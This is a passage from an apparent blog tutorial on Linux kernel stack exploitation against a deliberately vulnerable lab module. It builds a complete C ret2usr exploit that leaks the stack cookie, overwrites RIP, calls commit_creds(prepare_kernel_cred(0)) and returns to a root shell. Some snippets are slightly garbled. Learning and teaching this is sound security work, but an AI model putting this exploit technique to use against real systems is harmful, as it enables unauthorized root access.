<p>One of the vulnerabilities introduced in the <em>vuln_read()</em> function, is a <code class="language-plaintext highlighter-rouge">OOB</code> read vulnerability. This is because the length provided by an attacker is what will be read from the stack. This therefore allows us to leak the stack-cookie to bypass the stack-cookie mitigation implemented.</p>

<p>A <code class="language-plaintext highlighter-rouge">c</code> exploit script will be used throughout this post to build the exploit, with the following code snippet.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define FILE "/dev/vuln"
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>

        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="kt">FILE</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Open Error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="kt">FILE</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>

        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>

        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"leak[%d]: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<blockquote>
  <p>The <code class="language-plaintext highlighter-rouge">C</code> script above will be compiled as a statically-linked binary locally and added to the rootfs filesystem.</p>
</blockquote>

<p>Compile the above C code using the following GCC command</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-o</span> chall chall.c <span class="nt">-static</span>
</code></pre></div></div>

<p>Copy this file into the <code class="language-plaintext highlighter-rouge">rootfs</code> directory and re-archive the new file system to <em>cpio.gz</em>. This process will be repeated multiple times but as <code class="language-plaintext highlighter-rouge">ChatGPT</code> says: <em>“A task repeated multiple times may be automated by scripting once.”</em></p>

<p>The bash-script <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/bash.sh">here</a> will be used to automate the task of compiling the above <code class="language-plaintext highlighter-rouge">C</code> code, copying it into the rootfs, archiving this filesystem and finally running <code class="language-plaintext highlighter-rouge">qemu</code>.</p>

<p>When the emulator is restarted the compiled <code class="language-plaintext highlighter-rouge">chall</code> binary is now in the file system. Before running it, we need to attach a debugger and set the previous break-point before the <em>copy_to_user</em> function. Continue execution and now running <code class="language-plaintext highlighter-rouge">chall</code> will hit the breakpoint. At this point we expect the stack-cookie right after the buffer to be leaked since the <code class="language-plaintext highlighter-rouge">C</code> script reads 40 bytes <code class="language-plaintext highlighter-rouge">Out-Of-Bounds</code> compared to the 24 bytes allocated for the buffer on the stack.</p>

<p><img src="https://i.imgur.com/KRepBDr.png" alt="leak" /></p>

<p>This leak will be essential in bypassing the implement stack-cookie.</p>

<h3 id="stack-buffer-overflow">Stack Buffer Overflow</h3>

<p>Now to the real deal, the <em>vuln_write()</em> function defined in the loadable module is vulnerable to a stack-buffer overflow when more that <code class="language-plaintext highlighter-rouge">0x20</code> are written to the device driver interface <code class="language-plaintext highlighter-rouge">/dev/vuln</code>. Modify the above <code class="language-plaintext highlighter-rouge">C</code> script as follows to write <code class="language-plaintext highlighter-rouge">0x28</code> bytes on the stack and also return the leaked stack-cookie.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define FILE "/dev/vuln"
</span>
<span class="k">static</span> <span class="kt">long</span> <span class="n">stack_cookie</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">overflow_size</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>

        <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>

        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="kt">FILE</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Open Error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="kt">FILE</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>

        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>


        <span class="n">stack_cookie</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="n">leak</span><span class="p">[</span><span class="mh">0x3</span><span class="p">];</span>

        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] StackCookie: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">stack_cookie</span><span class="p">);</span>

        <span class="kt">uint64_t</span> <span class="n">overflow</span><span class="p">[</span><span class="n">overflow_size</span><span class="p">];</span> <span class="c1">//8 * 8 == 64 bytez</span>

        <span class="n">overflow_size</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>

        <span class="kt">int</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">overflow</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">overflow</span><span class="p">));</span>

        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] Wrote %d bytez</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span> 

</code></pre></div></div>
<p>Compile and launch the emulator using <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/bash.sh">this</a> bash script introduced above. From the emulator, we need to return the address of <em>vuln_write()</em> using the following command.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /proc/kallsyms | <span class="nb">grep</span> <span class="nt">-i</span> vuln_write
</code></pre></div></div>
<p><img src="https://i.imgur.com/lUpSQUl.png" alt="vuln_write" /></p>

<p>Attach the debugger to disassemble the <em>vuln_write</em> function and set a break-point write after the call to <em>memcpy()</em> whose address is marked as shown below.</p>

<p><img src="https://i.imgur.com/wJpVnTu.png" alt="vuln_write diass" /></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">br</span> <span class="o">*</span><span class="mh">0xffffffffc000011f</span>
</code></pre></div></div>

<p>The above will set a break-point right after the vulnerable <em>memcpy()</em>, continue execution and from the emulator run <code class="language-plaintext highlighter-rouge">./chall</code>. This should hit the break-point on the debugger and the stack can now be examined.</p>

<p><img src="https://i.imgur.com/6ObXBgd.png" alt="vuln_write_stack" /></p>

<p>As shown above, the stack-cookie is overwritten and when execution is continued, the Kernel Panics with a <code class="language-plaintext highlighter-rouge">Kernel Stack is Corrupted</code> error.</p>

<p><img src="https://i.imgur.com/jUpRWGj.png" alt="stack_cookie" /></p>

<p>The value that overwrote the stack-cookie was at index <code class="language-plaintext highlighter-rouge">0x4</code> in the <em>overflow</em> array. Edit the code above with the value of the stack_cookie leaked earlier to bypass the stack-cookie check. The overflow buffer will also be filled with junk values that will help up determine the offset of the return address when the Kernel crashes.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">overflow</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_cookie</span><span class="p">;</span>
<span class="n">overflow</span><span class="p">[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span>
<span class="n">overflow</span><span class="p">[</span><span class="mh">0x6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4343434343434343</span><span class="p">;</span>
<span class="n">overflow</span><span class="p">[</span><span class="mh">0x7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3030303030303030</span><span class="p">;</span>
</code></pre></div></div>

<p>Re-Compile the code and start <code class="language-plaintext highlighter-rouge">qemu</code>, running <code class="language-plaintext highlighter-rouge">chall</code> triggers a Kernel Panic and returns the registers values. As shown below, we can see that we successfuly overwrote <code class="language-plaintext highlighter-rouge">RIP</code> and its offset is <code class="language-plaintext highlighter-rouge">overflow[0x6]</code>.</p>

<p><img src="https://i.imgur.com/OG2kvsm.png" alt="rip_overwrite" /></p>

<p>With the offset to <code class="language-plaintext highlighter-rouge">RIP</code> and the stack-cookie we can now plan an attack to get a shell. If this was the exploitation of a UserSpace application we could have just returned to libc, or jump to shellcode on the stack. In the Kernel, there is not need for a shell; the aim is to return to userLand and gain a shell as a high privillege user i.e <code class="language-plaintext highlighter-rouge">root</code>.</p>

<h2 id="exploitation">Exploitation</h2>

<p>The exploitation of Kernel Stack Overflow depends on the mitigations implemented. In this case, not many mitigations are implemented we can therefore craft an attack to return back to the userland using the <code class="language-plaintext highlighter-rouge">ret2usr()</code> attack.</p>

<p>This is an attack that leverages the fact that userspace processes cannot access kernel space, but the Kernel can access user space to execute user space code. The code for privilege escalation will therefore be defined in the user-space, this code should call <em>commit_creds</em> and the <em>prepare_kernel_cred</em>, that reside in the Kernel in the format.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</code></pre></div></div>

<p>Why are the above functions called?</p>

<p>When we interact with the Kernel, for example via a syscall; each of these processes are represented in the Kernel in  a <code class="language-plaintext highlighter-rouge">struct task_struct</code> structure that is doubly-linked. The <code class="language-plaintext highlighter-rouge">task_struct</code> contains a member the <code class="language-plaintext highlighter-rouge">struct creds</code> that is used by the Kernel to determine if a specific process is allowed to do something for example execute a specific syscall. The aim of calling the above functions, is therefore to update/modify the creds structure to gain more permissions.</p>

<p>When the <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> function is called, it creates a new <code class="language-plaintext highlighter-rouge">cred struct</code> and more specifically when <code class="language-plaintext highlighter-rouge">0</code> is passed as the argument it sets the values like <code class="language-plaintext highlighter-rouge">UID/GID</code> to zero, therefore giving us a more higher privilege.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">daemon</span><span class="p">)</span>
</code></pre></div></div>

<p>The <em>commit_creds()</em> function on the other hand, installs a new <code class="language-plaintext highlighter-rouge">struct creds</code> for the current process. Therefore calling this functions together will have modified the current process’s privileges.</p>

<p>Since <code class="language-plaintext highlighter-rouge">KASLR</code> is disabled, the address of these functions can be obtained from <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code>.</p>

<p><img src="https://i.imgur.com/hevazr2.png" alt="" /></p>

<p>This code will therefore defined in the UserSpace in a function called <code class="language-plaintext highlighter-rouge">update_creds</code> as follows:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">update_creds</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="n">__asm__</span><span class="p">(</span>
		<span class="s">"movabs rax, 0xffffffff810894f0;"</span>
		<span class="s">"xor rdi, rdi;"</span>
		<span class="s">"call rax;"</span> 
		<span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span><span class="p">;</span><span class="s">"</span><span class="err">
</span><span class="s">		"</span><span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0xffffffff810892c0</span><span class="p">;</span><span class="s">"</span><span class="err">
</span><span class="s">		"</span><span class="n">call</span> <span class="n">rax</span><span class="p">;</span><span class="s">"</span><span class="err">
</span><span class="s">	);</span><span class="err">
</span><span class="s">}</span><span class="err">
</span><span class="s">....</span><span class="err">

</span><span class="s">overflow[0x4] = stack_cookie;</span><span class="err">
</span><span class="s">overflow[0x5] = 0x4141414141414141; //JUNK</span><span class="err">
</span><span class="s">overflow[0x6] = update_creds;</span><span class="err">
</span></code></pre></div></div>

<p>The above exploit script code can now be compiled using the following <code class="language-plaintext highlighter-rouge">GCC</code> command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-o</span> chall challc <span class="nt">-masm</span><span class="o">=</span>intel <span class="nt">-static</span>
</code></pre></div></div>

<h4 id="return-to-userland">Return-to-UserLand</h4>

<p>After changing our privileges, we now have to find a way to return to userland and pop a shell. When the Kernel returns to UserLand it uses the following instructions <code class="language-plaintext highlighter-rouge">iretq</code> and <code class="language-plaintext highlighter-rouge">sysretq</code>.</p>

<p>In this post, we will be using the <code class="language-plaintext highlighter-rouge">iretq</code> instruction. This instruction will require some registers which should be set-up on the stack in the following order.</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">RIP - Next Instruction
CS - Code Segment Register
eFLAGS - eFlag Registers
SP - Stack Pointer Register
SS - Stack Segment Register
</span></code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">RIP</code> register can finally be set to the address of a function that will pop a shell. The state of the other registers can be saved before exploitation and pushed on the stack after <code class="language-plaintext highlighter-rouge">iretq</code>.</p>

<p>First saving the code to save the registers will be declared in the <code class="language-plaintext highlighter-rouge">save_registers</code> function with the following code.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_rip</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">save_registers</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="n">__asm__</span><span class="p">(</span>
		<span class="s">"mov user_ss, ss;"</span>
		<span class="s">"mov user_cs, cs;"</span>
		<span class="s">"mov user_sp, rsp;"</span>
		<span class="s">"pushf;"</span> <span class="c1">//push all flag registers</span>
		<span class="s">"pop user_rflags;"</span>
	<span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Finally, the function whose address will be stored in the <code class="language-plaintext highlighter-rouge">rip</code> register will be as follows:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>


	<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">getgid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="n">puts</span><span class="p">(</span><span class="s">"[-] Failed to privz!!"</span><span class="p">);</span>
		<span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The final exploit code for a full <code class="language-plaintext highlighter-rouge">ret2usr</code> attack is as shown below:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define FILE "/dev/vuln"
</span>
<span class="k">static</span> <span class="kt">long</span> <span class="n">stack_cookie</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Returned to UserLandz"</span><span class="p">);</span>

        <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">getgid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Failed to Privz"</span><span class="p">);</span>
                <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">save_registers</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="n">__asm__</span><span class="p">(</span>
                <span class="s">"mov user_cs, cs;"</span>
                <span class="s">"mov user_ss, ss;"</span>
                <span class="s">"mov user_sp, rsp;"</span>
                <span class="s">"pushf;"</span>
                <span class="s">"pop user_rflags;"</span>
        <span class="p">);</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] Saved Registers!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">update_creds</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">get_shell</span><span class="p">;</span>
        <span class="n">__asm__</span><span class="p">(</span>
                <span class="s">"movabs rax, 0xffffffff810894f0;"</span>
                <span class="s">"xor rdi, rdi;"</span>
                <span class="s">"call rax; mov rdi, rax;"</span>
                <span class="s">"movabs rax, 0xffffffff810892c0;"</span>
                <span class="s">"call rax;"</span>
                <span class="s">"swapgs;"</span>
                <span class="s">"mov r9, user_ss;"</span>
                <span class="s">"push r9;"</span>
                <span class="s">"mov r9, user_sp;"</span>
                <span class="s">"push r9;"</span>
                <span class="s">"mov r9, user_rflags;"</span>
                <span class="s">"push r9;"</span>
                <span class="s">"mov r9, user_cs;"</span>
                <span class="s">"push r9;"</span>
                <span class="s">"mov r9, user_rip;"</span>
                <span class="s">"push r9;"</span>
                <span class="s">"iretq;"</span>
        <span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">overflow_size</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>

        <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>

        <span class="n">save_registers</span><span class="p">();</span> <span class="c1">//save the users-space registers before diving into thre Kernel;</span>

        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="kt">FILE</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Open Error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="kt">FILE</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>

        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>


        <span class="n">stack_cookie</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="n">leak</span><span class="p">[</span><span class="mh">0x3</span><span class="p">];</span>

        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] StackCookie: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">stack_cookie</span><span class="p">);</span>

        <span class="kt">uint64_t</span> <span class="n">overflow</span><span class="p">[</span><span class="n">overflow_size</span><span class="p">];</span> <span class="c1">//8 * 8 = 64 bytez</span>
                                          

        <span class="n">overflow</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_cookie</span><span class="p">;</span>

        <span class="n">overflow</span><span class="p">[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span> <span class="c1">//rbp</span>
        <span class="n">overflow</span><span class="p">[</span><span class="mh">0x6</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">update_creds</span><span class="p">;</span> <span class="c1">//ret</span>

        <span class="kt">int</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">overflow</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">overflow</span><span class="p">));</span>

        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"[+] Wrote %d bytez</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The modified assembly code in the <em>update_creds</em> function added the <code class="language-plaintext highlighter-rouge">swapgs</code> instruction that is used to swap the <code class="language-plaintext highlighter-rouge">GS</code> registers betwen the Kernel and UserSpace. The saved registers were also pushed on the stack; in the order required before the execution of <code class="language-plaintext highlighter-rouge">iretq</code>.</p>

<p>The above exploit worked because the following mitigations were not implemented:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">KASLR</code> : This is the same as the UserLand ASLR, and if this was implemented it would have randomized the address of <code class="language-plaintext highlighter-rouge">commit_creds</code> and <code class="language-plaintext highlighter-rouge">prepare_kernel_creds</code>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">SMAP</code>: Supervisor Mode Access Prevention is a protection that makes the user-space inaccessible no (RWX), if this was implemented we could not have access to the code stored in <code class="language-plaintext highlighter-rouge">update_creds</code>. In the Kernel this is enabled by setting the 20th bit of the Control Registers <code class="language-plaintext highlighter-rouge">CR4</code>. It can be bypassed by unsetting ths value, but due to additional mitigations this will not work.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">SMEP</code>: SuperVisor Mode Execution Prevention is an protection that makes the UserSpace non-executable and this is used together with SMAP. This is enabled by setting the 21st bit of the Control Register <code class="language-plaintext highlighter-rouge">CR4</code>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">KPTI</code>: Kernel Page Table Isolation is a mitigation that is used to separate the Kernel and the User Space  page table instead of using just one set of page tables that contain both user-space and kernel-space addresses.</p>
  </li>
</ul>

<h3 id="conclusion">Conclusion</h3>

<p>This was a simple introduction to the Kernel Stack and how an overflow can be exploited. The above mentioned mitigations can also be bypassed, by some other techniques like <code class="language-plaintext highlighter-rouge">ROP</code>, <code class="language-plaintext highlighter-rouge">KTPI Trampoline</code> etc.. more on this can be found in the reference section.</p>

<p>All the files used in this post can also be found <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts">here</a></p>

<h3 id="references">References</h3>

<ul>
  <li>[1] https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</li>
  <li>[2] https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development</li>
  <li>[3] https://snyk.io/blog/kernel-privilege-escalation/</li>
</ul>


  </div>

  <a class="u-url" href="/2023/05/28/Linux-Kernel-Stack-Exploitation.html" hidden></a>
</article>

      </div>
    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css">

<footer class="site-footer h-card">
  <data class="u-url" value="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
      </div>
      <div class="footer-col">
        <p></p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
    <a rel="me" href="https://x.com/BinaryChunk" target="_blank" title="BinaryChunk on X">
      <span class="grey fa-brands fa-x-twitter fa-lg"></span>
    </a>
  </li><li>
    <a rel="me" href="https://github.com/mutur4" target="_blank" title="BinaryChunk on Github">
      <span class="grey fa-brands fa-github fa-lg"></span>
    </a>
  </li>
</ul>
</div>

  </div>

</footer>

</body>

</html>
